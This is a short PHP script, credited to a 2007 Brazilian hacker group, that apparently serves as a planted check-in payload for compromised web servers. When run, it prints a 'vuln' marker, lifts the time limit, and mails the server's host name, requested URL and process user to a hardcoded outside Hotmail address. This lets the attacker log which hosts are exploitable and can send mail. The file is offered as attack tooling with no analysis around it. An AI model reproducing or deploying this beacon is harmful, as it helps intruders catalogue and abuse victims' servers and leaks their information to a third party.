<?php
//=================================
//
//    scan inb0x hotmail v1.0
//
//  coded by FilhOte_Ccs and LOST
//      não rippem fdps :]
//
//
//      Hacker Group 2007
//=================================
//
echo "!vuln!";
 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $user = @get_current_user();
 $email = "$user";
 $assunto = "chegou inbox";
 $email1 = "malkavian_ids@hotmail.com";
 $headers  = "From: <$email>rn";


 if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "Opa, enviado!";
 exit();
}
 else{
 echo "Não enviei..";
 exit();
 }
?>